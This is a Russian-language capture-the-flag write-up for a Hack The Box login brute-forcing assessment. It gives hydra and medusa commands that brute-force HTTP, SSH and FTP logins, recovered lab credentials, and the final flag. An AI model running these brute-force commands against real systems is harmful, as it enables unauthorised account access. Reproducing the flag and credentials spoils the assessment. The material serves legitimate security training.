## Задание

В первой части оценки навыков вам нужно будет перебрать все возможные варианты логина для целевого экземпляра. Если вы успешно подберете правильный логин, то получите имя пользователя, которое понадобится вам для второй части оценки навыков.
Используйте имя пользователя, которое вам дали при выполнении части 1 оценки навыков, чтобы принудительно выполнить вход в целевой экземпляр.


## Часть 1

При переходе по URL встречает окно логина, значит используем `hydra`

<img width="1041" height="374" alt="image" src="https://github.com/onomatore/HTB_SA/LoginBruteForcing/553886558-b286fc63-8e96-4cd1-991a-7d3713136ef7.png" />


Скачиваем необходимые списки для пароля и логина

Используем команду
```
hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt 94.237.63.174 -s 56021 http-get
```
И получаем логин и пароль

<img width="800" height="131" alt="image" src="https://github.com/user-attachments/assets/40ab3861-7bae-4965-9504-4e5d3162770b" />


Залогинившись получаем логин для следующей части

<img width="712" height="149" alt="image" src="https://github.com/user-attachments/assets/7910f3d1-de96-431d-8b5a-85e7dc96aa74" />

`satwossh` - предполагаю, что будем брутить ssh подключение.


## Часть 2

Необходимо подключиться по FTP и выкачать файл с флагом.

Для начала подберем пароль для `SSH`
Используем команду

```
medusa -h 94.237.58.137 -n 34028 -u satwossh -P 2023-200_most_used_passwords.txt -M ssh -f -v 6 -t 10
```

<img width="1448" height="257" alt="image" src="https://github.com/user-attachments/assets/e7eb4f67-880c-4215-9484-5f9a6e59d999" />


`ACCOUNT FOUND: [ssh] Host: 94.237.58.137 User: satwossh Password: password1 [SUCCESS]`
Нашли нужный нам пароль, теперь подгововим команду для брута `FTP`, хотя пользователя мы еще не знаем.  

```
medusa -h 127.0.0.1  -u  -P 2023-200_most_used_passwords.txt -M ftp  -v 6 -t 10
```

Подключаемся по `SSH`
<img width="967" height="470" alt="image" src="https://github.com/user-attachments/assets/40cd4b65-f887-4371-87c5-7c73593cdad6" />


Видим два интересных файла , а также username-anacrhy для создания списка логинов.
Просмотрим файл репорта

<img width="1854" height="294" alt="image" src="https://github.com/user-attachments/assets/f29341e8-6a87-44a9-ba66-d50dbaa29010" />

Получаем имя `Thomas Smith`
В файле паролей - пароли.
Создадим список имен для томаса смита.
`satwossh@ng-2296943-loginbfsatwo-63ids-85dc79c85d-rjkp7:~/username-anarchy$ ./username-anarchy Thomas Smith > username.txt`

Получили различные варианты 
<img width="970" height="397" alt="image" src="https://github.com/user-attachments/assets/bb3b4e3b-9a51-4943-b4c4-85bab488210c" />


Теперь проверим директории `/` и `/home`, а также перенесем файл с логинами в предыдущую папку.

<img width="1305" height="273" alt="image" src="https://github.com/user-attachments/assets/0642ba64-27ec-4f72-89d0-ae3953f67ab4" />

В директориях оказалось пусто.

Проведем сканирование сети
<img width="1024" height="433" alt="image" src="https://github.com/user-attachments/assets/174a36b1-1680-4e81-9dff-4a63e5a8d352" />

Видим открытый ftp порт, поэтому можем начинать брутфорсить, добавив в нашу команду список логинов и изменив название файла для паролей
```
medusa -h 127.0.0.1  -U username.txt  -P passwords.txt -M ftp  -v 6 -t 10
```


<img width="1390" height="377" alt="image" src="https://github.com/user-attachments/assets/023e8133-fa79-4499-bbeb-950d41320b81" />

Находим УЗ 
`ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: thomas Password: chocolate! [SUCCESS]`

Теперь осталось подключится по `FTP`
```
ftp ftp://thomas:chocolate!@localhost
```
<img width="964" height="48" alt="image" src="https://github.com/user-attachments/assets/6f706b4f-28d5-47e0-98c2-ace2beb47866" />

не дает зайти из-за символа `!`, поэтому оставим только логин и хост, а пароль введем уже при подключении 
<img width="893" height="284" alt="image" src="https://github.com/user-attachments/assets/137251ce-f8ed-4d69-b0cf-4e2c94c50b1b" />

Попадаем в облочку ftp
<img width="1830" height="375" alt="image" src="https://github.com/user-attachments/assets/bcfd0632-ce89-446b-b5f0-3b7df3ebe064" />

Просматриваем директорию на наличие файлов и обнаруживаем `flag.txt`, скачиваем его и просматриваем в нашем ssh подключении.
<img width="887" height="106" alt="image" src="https://github.com/user-attachments/assets/fdcd56c0-0250-4b9b-bb22-4c3e16659125" />

`HTB{brut3f0rc1ng_succ3ssful}`
